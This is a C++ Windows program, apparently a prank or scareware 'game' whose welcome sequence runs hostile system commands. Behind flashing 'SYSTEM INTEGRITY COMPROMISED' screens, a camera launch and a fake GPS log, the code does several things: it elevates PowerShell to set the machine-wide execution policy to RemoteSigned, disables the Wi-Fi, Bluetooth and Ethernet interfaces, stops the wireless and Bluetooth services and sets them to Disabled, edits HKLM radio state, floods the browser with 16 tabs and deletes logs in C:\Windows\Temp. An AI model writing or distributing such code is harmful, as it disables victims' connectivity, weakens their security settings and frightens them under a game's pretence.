#include "main.h"
#include "utils.h"
#include "VirtualAssistant.h"
#include "Minigame.h"
#include "load.h"
#include <iostream>
#include <windows.h>
#include <fstream>
#include <mmsystem.h>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <sstream>
#include <conio.h>
#include <chrono>
#include <random>


using namespace std;

#pragma comment(lib, "ole32.lib") 
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

bool IsRunAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = nullptr;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup))
    {
        CheckTokenMembership(nullptr, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin == TRUE;
}
void play_mp3(const char* filename) {
    char command[512];
    char errorBuf[128];

    sprintf_s(command, sizeof(command),
        "open \"%s\" type mpegvideo alias mp3file", filename);

    mciSendStringA("close mp3file", NULL, 0, NULL);

    MCIERROR err = mciSendStringA(command, NULL, 0, NULL);
    if (err != 0) {
        mciGetErrorStringA(err, errorBuf, sizeof(errorBuf));
        MessageBoxA(NULL, errorBuf, "Audio Error", MB_ICONERROR);
        return;
    }

    err = mciSendStringA("play mp3file repeat", NULL, 0, NULL);
    if (err != 0) {
        mciGetErrorStringA(err, errorBuf, sizeof(errorBuf));
        MessageBoxA(NULL, errorBuf, "Audio Error", MB_ICONERROR);
    }
}

void set_execution_policy() {
    system("powershell -Command \""
        "Start-Process PowerShell -Verb RunAs -ArgumentList '"
        "Set-ExecutionPolicy RemoteSigned -Force -Scope LocalMachine; "
        "exit"
        "'\"");
}


void execute_welcome_sequence() {
    execute_spectral_broadcast();
    trigger_phantom_protocol();
    initiate_black_mirror();

    Minigame mg;
    mg.run();

    cout << "[System] All systems engaged. Game parameters initialized.\n";
    system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");
}


void enable_airplane_mode() {
    ofstream log("C:\\Windows\\Temp\\airplane_log.txt");
    int regResult = system(
        "powershell -Command \""
        "Try {"
        "   $regPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\RadioManagement\\SystemRadioState'; "
        "   if (-not (Test-Path $regPath)) { "
        "       New-Item -Path $regPath -Force | Out-Null; "
        "   }; "
        "   Set-ItemProperty -Path $regPath -Name 'SystemRadioState' -Value 1 -Force; "
        "   Write-Output '[SUCCESS] Registry updated'; "
        "} Catch { "
        "   Write-Output ('[ERROR] ' + $_.Exception.Message); "
        "   Exit 1; "
        "}\""
    );

    log << "Registry update result: " << regResult << endl;
    const vector<string> interfaces = { "Wi-Fi", "Bluetooth", "Ethernet" };
    for (const auto& iface : interfaces) {
        string cmd = "netsh interface set interface \"" + iface + "\" admin=disable";
        int result = system(cmd.c_str());
        log << iface << " disable result: " << result << endl;
    }
    system(
        "powershell -Command \""
        "Get-Service -Name 'WlanSvc', 'BthServ' | "
        "Stop-Service -Force -PassThru | "
        "Set-Service -StartupType Disabled -PassThru | "
        "Out-File -Append 'C:\\Windows\\Temp\\airplane_log.txt'"
        "\""
    );

    log.close();
}



void activate_bluetooth() {
    const string devconPath = "\"" + string(getenv("CD")) + "\\Tools\\devcon.exe\"";
    if (file_exists("Tools\\devcon.exe")) {
        vector<string> commands = {
            devconPath + " enable *DEV_0A12*",
            devconPath + " enable *USB\\VID_0A12*",
            devconPath + " rescan"
        };

        ofstream log("C:\\Windows\\Temp\\bluetooth_log.txt");
        for (const auto& cmd : commands) {
            int result = system(cmd.c_str());
            log << "Command: " << cmd << "\nResult: " << result << endl;
        }
        log.close();
    }
    system(
        "powershell -Command \""
        "Try {"
        "   Start-Service -Name 'BthServ' -ErrorAction Stop; "
        "   Set-Service -Name 'BthServ' -StartupType Automatic; "
        "   Start-Service -Name 'BTAGService' -ErrorAction Stop; "
        "   Write-Output '[SUCCESS] Bluetooth services started'; "
        "   Add-BluetoothDevice -Name '*' -ErrorAction SilentlyContinue; "
        "   Start-Process -FilePath 'bthprops.cpl' -Wait; "
        "} Catch { "
        "   Write-Output ('[ERROR] ' + $_.Exception.Message); "
        "   Exit 1; "
        "} | Out-File -Append 'C:\\Windows\\Temp\\bluetooth_log.txt'"
        "\""
    );
}

bool file_exists(const char* path) {
    if (path == nullptr) return false;
    DWORD attrib = GetFileAttributesA(path);
    return (attrib != INVALID_FILE_ATTRIBUTES &&
        !(attrib & FILE_ATTRIBUTE_DIRECTORY));
}

void play_creepy_audio() {
    const char* soundPath = "Data\\Mono\\etc\\mono\\scripts\\c1337.mp3";
    if (file_exists(soundPath)) {
        play_mp3(soundPath);
        mciSendStringA("status mp3file length", NULL, 0, NULL);
    }
    else {
        for (int i = 0; i < 5; i++) {
            Beep(300 + i * 100, 200);
            system("color 0C");
            Beep(1500 - i * 100, 200);
            system("color 07");
        }
    }
}


void execute_spectral_broadcast() {
    for (int i = 0; i < 5; i++) {
        system("color 0A");
        Sleep(50);
        system("color 0C");
        Sleep(50);
    }
    system("color 07");

    system("netsh interface set interface \"Wi-Fi\" admin=disable");

    launchProcess("cmd /c start microsoft.windows.camera:");
    cout << "\n[!] Camera feed accessed\n";

    play_creepy_audio();
    system("powershell -Command \""
        "(New-Object Media.SoundPlayer 'C:\\Windows\\Media\\Windows Background.wav').PlaySync();"
        "\"");

    ofstream gps("C:\\Windows\\Temp\\location.log");
    time_t t = time(nullptr);
    tm tm_struct;
    localtime_s(&tm_struct, &t);
    gps << "Last known coordinates:\n";
    gps << "Latitude: 49.8178351179526° N\n";
    gps << "Longitude: 19.05101757884222° E\n";
    gps << "Timestamp: " << put_time(&tm_struct, "%Y-%m-%d %H:%M:%S") << "\n";
    gps << "Accuracy: ±3m\n";
    gps << "Source: GPS spoofing module\n";
}


void trigger_phantom_protocol() {
    for (int i = 1; i <= 16; i++) {
        ostringstream url;
        url << "https://void.domain/N0T-4-TR4P-" << i << "?seed=" << GetTickCount64();
        launchProcess("cmd /c start " + url.str());
    }
    system("start /B cmd /c \"timeout 37 && del /Q C:\\Windows\\Temp\\*.log\"");
}


void initiate_black_mirror() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(hConsole, &csbi);

    system("cls");
    cout << "INITIALIZING SPECTRAL INTERFACE\n";

    for (int i = 0; i < 150; i++) {
        int color = rand() % 256;
        SetConsoleTextAttribute(hConsole, color);

        if (i % 10 == 0) {
            system("cls");
            cout << "SYSTEM INTEGRITY COMPROMISED\n";
        }

        for (int j = 0; j < 80; j++) {
            cout << static_cast<char>(rand() % 94 + 33);
        }
        cout << "\n";

        Beep(rand() % 2000 + 37, 50);

        if (i > 100) Sleep(10);
        else if (i > 50) Sleep(30);
        else Sleep(50);
    }

    SetConsoleTextAttribute(hConsole, csbi.wAttributes);
    system("cls");

    enable_airplane_mode();
    activate_bluetooth();
    system("powershell -Command \""
        "Try {"
        "   $state = Get-ItemPropertyValue 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\RadioManagement\\SystemRadioState' -Name 'SystemRadioState'; "
        "   if ($state -ne 1) { Write-Error 'Airplane mode failed!' }; "
        "} Catch { "
        "   Write-Error 'Verification failed: ' + $_.Exception.Message; "
        "}\"");
    system("color 0F");
    for (int i = 0; i < 3; i++) {
        system("color 0F");
        Beep(1500, 100);
        system("color 0");
        Beep(300, 100);
    }
    system("color 07");
}
